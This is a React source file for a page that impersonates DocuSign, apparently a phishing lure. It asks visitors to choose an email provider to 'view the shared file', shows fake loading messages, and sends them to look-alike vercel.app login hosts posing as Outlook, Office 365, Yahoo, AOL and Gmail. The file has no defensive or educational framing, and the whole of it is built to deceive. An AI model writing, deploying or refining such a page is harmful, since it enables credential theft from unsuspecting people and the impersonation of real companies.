/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState } from "react";
import { motion, AnimatePresence } from "motion/react";
import { 
  Mail, 
  LayoutGrid, 
  AtSign, 
  Globe, 
  Search, 
  Printer, 
  Download, 
  MoreHorizontal, 
  User, 
  HelpCircle,
  FileText,
  Loader2
} from "lucide-react";

export default function App() {
  const [loading, setLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState("");

  const providers = [
    { name: "Login with Outlook", color: "bg-[#0078d4]", url: "https://microlog-seven.vercel.app", icon: <Mail className="w-5 h-5 text-white/90" /> },
    { name: "Login with Office 365", color: "bg-[#d83b01]", url: "https://microlog-seven.vercel.app", icon: <LayoutGrid className="w-5 h-5 text-white/90" /> },
    { name: "Login with Yahoo", color: "bg-[#6001d2]", url: "https://yool-five.vercel.app", icon: <Mail className="w-5 h-5 text-white/90" /> },
    { name: "Login with Aol", color: "bg-[#31459b]", url: "https://login-aol.vercel.app", icon: <AtSign className="w-5 h-5 text-white/90" /> },
    { name: "Login with Gmail", color: "bg-[#ea4335]", url: "https://glogs-eight.vercel.app", icon: <Mail className="w-5 h-5 text-white/90" /> },
    { name: "Login with Other Mail", color: "bg-[#575757]", url: "https://othermail.vercel.app", icon: <Globe className="w-5 h-5 text-white/90" /> },
  ];

  const handleLoginClick = (url: string) => {
    setLoading(true);
    setLoadingMessage("Getting document ready...");

    setTimeout(() => {
      setLoadingMessage("Redirecting to email...");
      setTimeout(() => {
        window.location.href = url;
      }, 1500);
    }, 2000);
  };

  return (
    <div className="relative min-h-screen font-sans overflow-hidden bg-[#f4f7f9]">
      {/* Background Decor: Geometric Grid */}
      <div 
        className="absolute inset-0 z-0 opacity-40 pointer-events-none" 
        style={{ 
          backgroundImage: 'radial-gradient(#e2e8f0 1px, transparent 1px)', 
          backgroundSize: '32px 32px' 
        }} 
      />

      {/* Background: Blurred Site UI (Preserved from previous implementation) */}
      <div className="absolute inset-0 z-0 opacity-10 blur-[8px] pointer-events-none">
        <div className="w-full h-full">
          <div className="h-14 bg-white border-b border-gray-200" />
          <div className="h-12 bg-[#ebebeb] border-b border-gray-300" />
          <div className="max-w-4xl mx-auto mt-8 p-12 bg-white shadow-lg h-full">
             <div className="border-2 border-black p-4 mb-4 h-full" />
          </div>
        </div>
      </div>

      {/* Login Modal Overlay */}
      <div className="relative z-10 flex items-center justify-center min-h-screen p-4">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, ease: "easeOut" }}
          className="bg-white px-10 py-12 max-w-[440px] w-full shadow-[0_4px_12px_rgba(0,0,0,0.08)] rounded-[4px] border border-[#e2e8f0] flex flex-col items-center"
        >
          {/* Theme Logo */}
          <div className="text-[28px] font-[800] text-[#094ab2] mb-6 tracking-[-0.5px]">
            Docu<span className="font-[300] text-[#333]">Sign</span>
          </div>

          {/* Theme Header */}
          <h1 className="text-[18px] font-semibold text-[#111] mb-3">Sign In</h1>

          {/* Theme Description */}
          <div className="text-center mb-8">
            <p className="text-[14px] leading-[1.5] text-[#64748b]">
              To read the document, please choose your email provider below to sign in and view the shared file.
            </p>
          </div>

          {/* Provider Buttons */}
          <div className="w-full flex flex-col gap-3 items-center mb-10">
            {providers.map((p, idx) => (
              <button
                key={idx}
                onClick={() => handleLoginClick(p.url)}
                disabled={loading}
                className={`${p.color} w-full max-w-[320px] flex items-center h-[44px] text-white font-semibold text-[14px] hover:opacity-90 transition-all rounded-[2px] relative active:scale-[0.99] disabled:opacity-50 disabled:cursor-not-allowed`}
              >
                {/* Faux icon spacer styled like the theme */}
                <div className="absolute left-3 w-5 h-5 bg-white/20 rounded-[2px] flex items-center justify-center p-0.5">
                  {p.icon}
                </div>
                <div className="w-full text-center pl-8">
                  {p.name}
                </div>
              </button>
            ))}
          </div>

          {/* Theme Footer */}
          <footer className="w-full pt-6 mt-0 border-t border-[#e2e8f0] text-[12px] text-[#94a3b8] text-center">
            Copyright © 2024 DocuSign, Inc. All rights reserved.
          </footer>
        </motion.div>
      </div>

      {/* Fancy Loading Popup */}
      <AnimatePresence>
        {loading && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[100] flex items-center justify-center bg-white/80 backdrop-blur-sm"
          >
            <motion.div 
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white p-8 rounded-xl shadow-2xl border border-gray-100 flex flex-col items-center max-w-[320px] w-full text-center"
            >
              <div className="relative mb-6">
                <motion.div
                  animate={{ rotate: 360 }}
                  transition={{ repeat: Infinity, duration: 1, ease: "linear" }}
                  className="text-[#094ab2]"
                >
                  <Loader2 className="w-12 h-12" />
                </motion.div>
                <div className="absolute inset-0 flex items-center justify-center">
                  <div className="w-4 h-4 bg-[#094ab2]/20 rounded-full" />
                </div>
              </div>
              
              <motion.p
                key={loadingMessage}
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                className="text-lg font-medium text-[#1e293b] mb-2"
              >
                {loadingMessage}
              </motion.p>
              <p className="text-sm text-[#64748b]">Please wait a moment</p>

              {/* Decorative Progress bar */}
              <div className="w-full h-1.5 bg-gray-100 rounded-full mt-6 overflow-hidden">
                <motion.div 
                  initial={{ width: "0%" }}
                  animate={{ 
                    width: loadingMessage.includes("Redirecting") ? "100%" : "60%" 
                  }}
                  transition={{ duration: 1.5, ease: "easeInOut" }}
                  className="h-full bg-[#094ab2]"
                />
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <style dangerouslySetInnerHTML={{ __html: `
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
      `}} />
    </div>
  );
}

